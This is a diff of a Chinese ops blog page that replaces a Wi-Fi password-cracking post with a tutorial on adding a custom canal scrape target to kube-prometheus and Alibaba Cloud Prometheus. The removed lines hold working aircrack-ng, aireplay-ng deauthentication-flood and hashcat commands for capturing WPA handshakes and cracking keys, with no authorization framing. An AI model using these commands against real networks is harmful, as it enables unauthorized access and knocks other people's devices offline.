@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Wifi密码破解 | 运维人</title>
-  <meta name="keywords" content=" aircrack-ng , arimon-ng ">
-  <meta name="description" content="Wifi密码破解 | 运维人">
+  <title>Kube-prometheus添加自定义监控项 | 运维人</title>
+  <meta name="keywords" content=" k8s , Prometheus ">
+  <meta name="description" content="Kube-prometheus添加自定义监控项 | 运维人">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="一、缘由本文档题目也可叫做，kube-prometheus添加target。 公司有个canal项目想接入prometheus进行监控告警，从canal官档介绍看到只需配置prometheus.yaml添加canal的job后重启服务，即可将canal接入prometheus监控。 官档介绍的是非容器部署的prometheus，鉴于我司有k8s环境，我就想将canal接入k8s集群的prometh">
 <meta property="og:type" content="article">
@@ -1391,9 +1391,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-Wifi密码破解" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Kube-prometheus添加自定义监控项" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Wifi密码破解</h1>
+        <h1 class="article-title">Kube-prometheus添加自定义监控项</h1>
     
     <div class="article-meta">
         
@@ -1403,9 +1403,9 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="工具">工具</a> > 
+            <a  data-rel="虚拟化">虚拟化</a> > 
             
-            <a  data-rel="工具&lt;---&gt;破解">破解</a>
+            <a  data-rel="虚拟化&lt;---&gt;K8s">K8s</a>
             
         </span>
         
@@ -1413,21 +1413,21 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color2">aircrack-ng</a>
+            <a class="color4">k8s</a>
             
-            <a class="color5">arimon-ng</a>
+            <a class="color1">Prometheus</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2021-03-16 20:01:03'>2021-02-02 10:02</time>
+            发布时间 : <time class="date" title='最后更新: 2022-04-19 14:19:02'>2022-04-19 13:57</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:544</span>
+        <span>字数:1.6k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -1457,7 +1457,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%85%B3%E9%97%AD%E7%BD%91%E7%BB%9C%E5%92%8C%E4%BC%9A%E5%BD%B1%E5%93%8D%E5%88%B0%E7%A0%B4%E8%A7%A3%E7%9A%84%E8%BF%9B%E7%A8%8B"><span class="toc-text">1、关闭网络和会影响到破解的进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%89%93%E5%BC%80%E7%BD%91%E7%BB%9C%E7%9B%91%E5%90%AC"><span class="toc-text">2、打开网络监听</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E9%99%84%E5%BD%95%EF%BC%9A"><span class="toc-text">3、附录：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E4%BD%BF%E7%94%A8%E6%98%BE%E5%8D%A1%E7%9A%84%E8%BF%90%E7%AE%97%E8%83%BD%E5%8A%9B"><span class="toc-text">1、使用显卡的运算能力</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-text">2、参考链接：</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%BC%98%E7%94%B1"><span class="toc-text">一、缘由</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E9%83%A8%E7%BD%B2%E6%AD%A5%E9%AA%A4%EF%BC%88%E8%87%AA%E5%BB%BAK8S%E7%9A%84Prometheus%EF%BC%89"><span class="toc-text">二、部署步骤（自建K8S的Prometheus）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81Exporter%E4%BB%8B%E7%BB%8D"><span class="toc-text">1、Exporter介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-Exporter%E6%8C%89%E6%9D%A5%E6%BA%90%E5%88%86%E7%B1%BB"><span class="toc-text">1.1 Exporter按来源分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-Exporter%E6%8C%89%E8%BF%90%E8%A1%8C%E6%96%B9%E5%BC%8F%E5%88%86%E7%B1%BB"><span class="toc-text">1.2 Exporter按运行方式分类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E9%83%A8%E7%BD%B2Prometheus"><span class="toc-text">2、部署Prometheus</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-%E4%B8%8B%E8%BD%BD"><span class="toc-text">2.1 下载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-%E9%83%A8%E7%BD%B2"><span class="toc-text">2.2 部署</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-%E5%88%A0%E9%99%A4%EF%BC%88%E6%A0%B9%E6%8D%AE%E9%9C%80%E6%B1%82%EF%BC%89"><span class="toc-text">2.3 删除（根据需求）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%B7%BB%E5%8A%A0target%E5%B9%B6%E5%BA%94%E7%94%A8%E5%88%B0%E9%9B%86%E7%BE%A4"><span class="toc-text">3、添加target并应用到集群</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-%E5%A2%9E%E5%8A%A0target"><span class="toc-text">3.1 增加target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-%E5%88%9B%E5%BB%BA%E6%96%B0%E7%9A%84secret%E5%B9%B6%E5%BA%94%E7%94%A8%E5%88%B0prometheus"><span class="toc-text">3.2 创建新的secret并应用到prometheus</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-%E5%B0%86target%E5%BA%94%E7%94%A8%E5%88%B0%E9%9B%86%E7%BE%A4"><span class="toc-text">3.3 将target应用到集群</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E9%AA%8C%E8%AF%81"><span class="toc-text">4、验证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E9%83%A8%E7%BD%B2%E6%AD%A5%E9%AA%A4%EF%BC%88%E9%98%BF%E9%87%8C%E4%BA%91Prometheus%EF%BC%89"><span class="toc-text">三、部署步骤（阿里云Prometheus）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E9%83%A8%E7%BD%B2"><span class="toc-text">1、部署</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E9%AA%8C%E8%AF%81"><span class="toc-text">2、验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%8C%81%E4%B9%85%E5%8C%96%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8"><span class="toc-text">四、持久化数据存储</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E6%A0%B9%E6%8D%AE%E9%9C%80%E8%A6%81%E8%B0%83%E6%95%B4%E6%8C%81%E4%B9%85%E5%8C%96%E5%AD%98%E5%82%A8%E7%AD%96%E7%95%A5%EF%BC%9A"><span class="toc-text">4.1 根据需要调整持久化存储策略：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%8F%82%E8%80%83"><span class="toc-text">五、参考</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1473,28 +1473,170 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="1、关闭网络和会影响到破解的进程"><a href="#1、关闭网络和会影响到破解的进程" class="headerlink" title="1、关闭网络和会影响到破解的进程"></a>1、关闭网络和会影响到破解的进程</h2><ol>
-<li><code>service net-manager stop</code> 关闭网络功能</li>
-<li> <code>airmon-ng check kill</code> 关闭相关进程</li>
+        <h2 id="一、缘由"><a href="#一、缘由" class="headerlink" title="一、缘由"></a>一、缘由</h2><p>本文档题目也可叫做，<strong>kube-prometheus添加target</strong>。</p>
+<p>公司有个canal项目想接入prometheus进行监控告警，从<a target="_blank" rel="noopener" href="https://github.com/alibaba/canal/wiki/Prometheus-QuickStart">canal官档</a>介绍看到只需配置prometheus.yaml添加canal的job后重启服务，即可将canal接入prometheus监控。</p>
+<p>官档介绍的是非容器部署的prometheus，鉴于我司有k8s环境，我就想将canal接入k8s集群的prometheus监控。</p>
+<h2 id="二、部署步骤（自建K8S的Prometheus）"><a href="#二、部署步骤（自建K8S的Prometheus）" class="headerlink" title="二、部署步骤（自建K8S的Prometheus）"></a>二、部署步骤（自建K8S的Prometheus）</h2><h3 id="1、Exporter介绍"><a href="#1、Exporter介绍" class="headerlink" title="1、Exporter介绍"></a>1、Exporter介绍</h3><p>一般来讲向Prometheus提供监控样本数据的程序都可以被称为一个Exporter，Exporter的一个实例称为Target。Prometheus通过轮询的方式定时从这些Target中获取监控数据样本，并且存储在数据库当中。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/LdOyEF"><img src="https://s1.ax1x.com/2022/04/18/LdOyEF.png" alt="LdOyEF.png"></a></p>
+<h4 id="1-1-Exporter按来源分类"><a href="#1-1-Exporter按来源分类" class="headerlink" title="1.1 Exporter按来源分类"></a>1.1 Exporter按来源分类</h4><ul>
+<li><p><strong>社区提供的</strong>：比如Node Exporter、MySQL Exporter、Nginx Exporter等</p>
+<table>
+<thead>
+<tr>
+<th align="center">范围</th>
+<th align="center">常用Exporter</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">数据库</td>
+<td align="center">MySQL Exporter, Redis Exporter,  MongoDB Exporter, MSSQL Exporter等</td>
+</tr>
+<tr>
+<td align="center">硬件</td>
+<td align="center">Apcupsd Exporter，IoT Edison  Exporter， IPMI Exporter, Node Exporter等</td>
+</tr>
+<tr>
+<td align="center">消息队列</td>
+<td align="center">Beanstalkd Exporter, Kafka  Exporter, NSQ Exporter, RabbitMQ Exporter等</td>
+</tr>
+<tr>
+<td align="center">存储</td>
+<td align="center">Ceph Exporter, Gluster Exporter,  HDFS Exporter, ScaleIO Exporter等</td>
+</tr>
+<tr>
+<td align="center">HTTP服务</td>
+<td align="center">Apache Exporter, HAProxy  Exporter, Nginx Exporter等</td>
+</tr>
+<tr>
+<td align="center">API服务</td>
+<td align="center">AWS ECS Exporter， Docker Cloud  Exporter, Docker Hub Exporter, GitHub Exporter等</td>
+</tr>
+<tr>
+<td align="center">日志</td>
+<td align="center">Fluentd Exporter, Grok Exporter等</td>
+</tr>
+<tr>
+<td align="center">监控系统</td>
+<td align="center">Collectd Exporter, Graphite  Exporter, InfluxDB Exporter, Nagios Exporter, SNMP Exporter等</td>
+</tr>
+<tr>
+<td align="center">其它</td>
+<td align="center">Blockbox Exporter, JIRA  Exporter, Jenkins Exporter， Confluence Exporter等</td>
+</tr>
+</tbody></table>
+</li>
+<li><p><strong>用户自定义的</strong>：用户还可以基于Prometheus提供的Client Library创建自己的Exporter程序。目前Promthues社区官方提供了对以下编程语言的支持：Go、Java/Scala、Python、Ruby。同时还有第三方实现的如：Bash、C++、Common Lisp、Erlang,、Haskeel、Lua、Node.js、PHP、Rust等。</p>
+</li>
+</ul>
+<h4 id="1-2-Exporter按运行方式分类"><a href="#1-2-Exporter按运行方式分类" class="headerlink" title="1.2 Exporter按运行方式分类"></a>1.2 Exporter按运行方式分类</h4><ul>
+<li><p><strong>独立使用的</strong></p>
+<p>以我们已经使用过的Node Exporter为例，由于操作系统本身并不直接支持Prometheus，同时用户也无法通过直接从操作系统层面上提供对Prometheus的支持。因此，用户只能通过独立运行一个程序的方式，通过操作系统提供的相关接口，将系统的运行状态数据转换为可供Prometheus读取的监控数据。 除了Node Exporter以外，比如MySQL Exporter、Redis Exporter等都是通过这种方式实现的。 这些Exporter程序扮演了一个中间代理人的角色。</p>
+</li>
+<li><p><strong>集成到应用中的</strong></p>
+<p>为了能够更好的监控系统的内部运行状态，有些开源项目如Kubernetes，ETCD等直接在代码中使用了Prometheus的Client Library，提供了对Prometheus的直接支持。这种方式打破的监控的界限，让应用程序可以直接将内部的运行状态暴露给Prometheus，适合于一些需要更多自定义监控指标需求的项目。</p>
+<pre><code> **我要纳入监控的cannal项目，就属于集成到应用中的，直接访问http://ip:port即可拿到监控数据，不要部署代理Exporter程序。**
+</code></pre>
+</li>
+</ul>
+<h3 id="2、部署Prometheus"><a href="#2、部署Prometheus" class="headerlink" title="2、部署Prometheus"></a>2、部署Prometheus</h3><h4 id="2-1-下载"><a href="#2-1-下载" class="headerlink" title="2.1 下载"></a>2.1 下载</h4><pre><code class="bash">git clone https://github.com/prometheus-operator/kube-prometheus.git
+cd kube-prometheus
+</code></pre>
+<h4 id="2-2-部署"><a href="#2-2-部署" class="headerlink" title="2.2 部署"></a>2.2 部署</h4><pre><code class="bash"># Create the namespace and CRDs, and then wait for them to be available before creating the remaining resources
+kubectl apply --server-side -f manifests/setup
+until kubectl get servicemonitors --all-namespaces ; do date; sleep 1; echo &quot;&quot;; done
+kubectl apply -f manifests/
+</code></pre>
+<p>部署成功后，结果如下（如果部署失败，可手动想办法更换镜像地址）：</p>
+<pre><code class="bash">root@k8s-master001:~# kubectl get pods -n monitoring
+NAME                                  READY   STATUS    RESTARTS   AGE
+alertmanager-main-0                   2/2     Running   0          3d1h
+alertmanager-main-1                   2/2     Running   0          3d1h
+alertmanager-main-2                   2/2     Running   0          3d1h
+blackbox-exporter-5cb5d7479d-cqxrd    3/3     Running   0          3d1h
+grafana-789bc4b4b8-wjk4j              1/1     Running   0          3d1h
+kube-state-metrics-79f478884f-w6mqw   3/3     Running   0          3d1h
+node-exporter-cl42r                   2/2     Running   0          3d1h
+node-exporter-f8n6n                   2/2     Running   0          3d1h
+node-exporter-m4xqr                   2/2     Running   0          3d1h
+prometheus-adapter-7bf7ff5b67-gph5t   1/1     Running   0          3d1h
+prometheus-adapter-7bf7ff5b67-pppq2   1/1     Running   0          3d1h
+prometheus-k8s-0                      2/2     Running   0          3d1h
+prometheus-k8s-1                      2/2     Running   0          3d1h
+prometheus-operator-b998f8597-k75bm   2/2     Running   0          3d1h
+</code></pre>
+<p>将Prometheus映射出去，可以在局域网（公网）访问：</p>
+<pre><code class="bash">#!/bin/bash
+nohup kubectl --namespace monitoring port-forward --address 0.0.0.0 svc/prometheus-k8s 9090:9090 &amp;
+</code></pre>
+<p>之后可以通过 http://内网IP:9090 访问Prometheus的dashboard。</p>
+<h4 id="2-3-删除（根据需求）"><a href="#2-3-删除（根据需求）" class="headerlink" title="2.3 删除（根据需求）"></a>2.3 删除（根据需求）</h4><p><code>kubectl delete --ignore-not-found=true -f manifests/ -f manifests/setup</code></p>
+<h3 id="3、添加target并应用到集群"><a href="#3、添加target并应用到集群" class="headerlink" title="3、添加target并应用到集群"></a>3、添加target并应用到集群</h3><h4 id="3-1-增加target"><a href="#3-1-增加target" class="headerlink" title="3.1 增加target"></a>3.1 增加target</h4><p>编写需要增加的target添加到prometheus-additional.yaml 文件里面，不存在就新建。</p>
+<pre><code class="bash">cat &gt;&gt; ./kube-prometheus/manifests/prometheus-additional.yaml  &lt;&lt; EOF
+- job_name: &#39;canal&#39;
+  scrape_interval: 15s
+  scrape_timeout: 15s
+  static_configs:
+  - targets: [&#39;10.31.4.225:11112&#39;]
+EOF
+</code></pre>
+<p>注释：根据实际情况，修改job_name和targets变量即可。</p>
+<h4 id="3-2-创建新的secret并应用到prometheus"><a href="#3-2-创建新的secret并应用到prometheus" class="headerlink" title="3.2 创建新的secret并应用到prometheus"></a>3.2 创建新的secret并应用到prometheus</h4><pre><code class="bash">cd ./kube-prometheus/manifests/
+# 创建secret
+kubectl create secret generic additional-scrape-configs -n monitoring --from-file=prometheus-additional.yaml --dry-run=client -o yaml &gt; additional-scrape-configs.yaml
+# 应用到prometheus
+kubectl apply -f additional-scrape-configs.yaml -n monitoring
+</code></pre>
+<h4 id="3-3-将target应用到集群"><a href="#3-3-将target应用到集群" class="headerlink" title="3.3 将target应用到集群"></a>3.3 将target应用到集群</h4><p>这一步类似于修改正常部署模式下的prometheus.yaml配置文件。</p>
+<pre><code class="bash">vim kube-prometheus/manifests/prometheus-prometheus.yaml
+  additionalScrapeConfigs:
+    name: additional-configs
+    key: prometheus-additional.yaml
+</code></pre>
+<p>具体添加位置如下：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L0NIDe"><img src="https://s1.ax1x.com/2022/04/19/L0NIDe.png" alt="L0NIDe.png"></a></p>
+<p>应用变更到K8S生效：</p>
+<pre><code class="bash">kubectl apply -f kube-prometheus/manifests/prometheus-prometheus.yaml -n monitoring
+</code></pre>
+<h4 id="4、验证"><a href="#4、验证" class="headerlink" title="4、验证"></a>4、验证</h4><p>稍等片刻，查看prometheus的target列表即可，或者prometheus–&gt; Status–&gt;Configuration 中可以搜到job_name为canal的配置信息。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L0Urxf"><img src="https://s1.ax1x.com/2022/04/19/L0Urxf.png" alt="L0Urxf.png"></a></p>
+<p>同时，我们上一步添加的Secret可以通过K8s集群查看到。</p>
+<p><strong>以上的修改和添加，在Prometheus Operator项目的example/<a target="_blank" rel="noopener" href="https://github.com/prometheus-operator/prometheus-operator/tree/main/example/additional-scrape-configs">additional-scrape-configs</a>中有一样的例子可供参考。</strong></p>
+<h2 id="三、部署步骤（阿里云Prometheus）"><a href="#三、部署步骤（阿里云Prometheus）" class="headerlink" title="三、部署步骤（阿里云Prometheus）"></a>三、部署步骤（阿里云Prometheus）</h2><h3 id="1、部署"><a href="#1、部署" class="headerlink" title="1、部署"></a>1、部署</h3><p>需要监控部署在K8s集群之外的业务数据，如Redis连接数。操作步骤如下：</p>
+<ol>
+<li><p>在阿里云Prometheus监控服务控制台页面，选择相应地区的Prometheus实例。</p>
+</li>
+<li><p>在设置页面，单击<strong>Prometheus设置</strong>页签。</p>
+</li>
+<li><p>在Prometheus.yaml中输入以下内容，然后单击保存。</p>
+<pre><code class="yaml">global:
+  scrape_interval:     15s # Set the scrape interval to every 15 seconds. Default is every 1 minute.
+  evaluation_interval: 15s # Evaluate rules every 15 seconds. The default is every 1 minute.
+scrape_configs:
+  - job_name: &#39;canal&#39;
+    static_configs:
+    - targets: [&#39;10.31.4.225:11112&#39;]
+</code></pre>
+</li>
 </ol>
-<h2 id="2、打开网络监听"><a href="#2、打开网络监听" class="headerlink" title="2、打开网络监听"></a>2、打开网络监听</h2><ol>
-<li><code>iwconfig</code> 命令查看本机的网卡，可以看到无线网卡wlan0</li>
-<li><code>airmon-ng</code> 命令列出支持监控模式的无线网卡，如没有输出，则表示本机无线网卡不支持监控模式。</li>
-<li> <code>airmon-ng start wlan0</code> 打开网络监听，wlan0为你的无线网卡名称。如果有报错<code>Operation not possible due to RF-kill</code>，则手动关掉wifid的soft blocked，<code>rfkill list</code> , <code>rfkill unblock 2</code>。</li>
-<li><code>airodump-ng wlan0mon</code> 监听所有wifi， wlan0mon 也可能是mon0，并记录BSSID, CH, ESSID, 考虑data列有数据的WIFI。BSSID是路由器的MAC地址，CH路由器WIFI频道，ESSID为WIFI的名字，<strong>窗口1</strong>。</li>
-<li><code>airodump-ng --bssid xx:xx:xx:xx:xx:xx -c 1 -w ~/Desktop/cap/xxx.cap  wlan0mon</code> 监听特定的频道，不要结束此进程，不要关掉此窗口，<strong>窗口2</strong>。</li>
-<li><code>aireplay-ng -0 2 -a xx:xx:xx:xx:xx:xx -c xx:xx:xx:xx:xx:xx wlan0mon</code> 获取握手包数据，新开一个终端执行，当上一步时间后面出现WAP handshake时说明获取成功。需要多尝试几次  ，<strong>窗口3</strong>。 或者 <code>aireplay-ng -0 0 -a 28:6C:07:53:53:80 wlam0mon</code> 进行洪水攻击，不断攻击，让所有设备下线。</li>
-<li><code>aircrack-ng -w 1.txt tmp-02.cap</code> 硬破解密码，1.txt是密码包，temp-02.cap是握手包。会执行很长时间，直到提示key fund！<strong>窗口4</strong></li>
-<li><code>airmon-ng stop wlan0mon</code> 关闭网络监听。</li>
-<li><code>service network-manager start</code> 打开网络。</li>
-</ol>
-<h2 id="3、附录："><a href="#3、附录：" class="headerlink" title="3、附录："></a>3、附录：</h2><h3 id="1、使用显卡的运算能力"><a href="#1、使用显卡的运算能力" class="headerlink" title="1、使用显卡的运算能力"></a>1、使用显卡的运算能力</h3><p>如果你有一个强大的GPU，为什么不使用GPU跑字典呢？<br>Hashcat可以借助GPU的运算力破解各种不同算法的hash值。<br>下载时要注意选择正确的显卡类型（AMD、NVidia）。Kali Linux自带这个工具。<br>在破解cap文件之前，要把它转换为hccap文件：</p>
-<p><code>aircrack-ng file.cap -J out.hccap</code></p>
-<p>使用GPU破解hash：</p>
-<p><code>hashcat -m 2500 out.hccap 字典文件</code></p>
-<h3 id="2、参考链接："><a href="#2、参考链接：" class="headerlink" title="2、参考链接："></a>2、参考链接：</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/GrayOnDream/article/details/51859688?locationNum=13">https://blog.csdn.net/GrayOnDream/article/details/51859688?locationNum=13</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37367124/article/details/79587713">https://blog.csdn.net/qq_37367124/article/details/79587713</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/daoyi/p/Kali-Linux-shi-yongAircrack-po-jiewifi-mi-ma-wpawp.html">https://www.cnblogs.com/daoyi/p/Kali-Linux-shi-yongAircrack-po-jiewifi-mi-ma-wpawp.html</a></p>
+<h3 id="2、验证"><a href="#2、验证" class="headerlink" title="2、验证"></a>2、验证</h3><p>在阿里云Prometheus监控服务页面，选择某个地区对应的实例后，选择客户端接入后，即可看到我们自定义接入的target。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L0wFPA"><img src="https://s1.ax1x.com/2022/04/19/L0wFPA.png" alt="L0wFPA.png"></a></p>
+<h2 id="四、持久化数据存储"><a href="#四、持久化数据存储" class="headerlink" title="四、持久化数据存储"></a>四、持久化数据存储</h2><h3 id="4-1-根据需要调整持久化存储策略："><a href="#4-1-根据需要调整持久化存储策略：" class="headerlink" title="4.1 根据需要调整持久化存储策略："></a>4.1 根据需要调整持久化存储策略：</h3><ul>
+<li><p>grafana和prometheus的数据都需要做持久存储。</p>
+</li>
+<li><p>grafana持久持久存储是因为可能安装些第三方的插件。</p>
+</li>
+<li><p>prometheus的持久存储，自不必多说，那是肯定需要的。</p>
+</li>
+</ul>
+<p>我们部署在云上，持久化存储这块，可以很方便的使用他们提供的服务（NFS、OSS、aliyun-disk都可以）</p>
+<h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><ul>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/prometheus-operator/prometheus-operator">prometheus-operator项目</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/prometheus-operator/prometheus-operator/blob/main/Documentation/additional-scrape-config.md">添加自定义监控配置官方文档 Additional Scrape Configuration</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/alibaba/canal/wiki/Prometheus-QuickStart">canal项目官方文档</a></p>
+</li>
+</ul>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 lxwno.1@163.com </span>
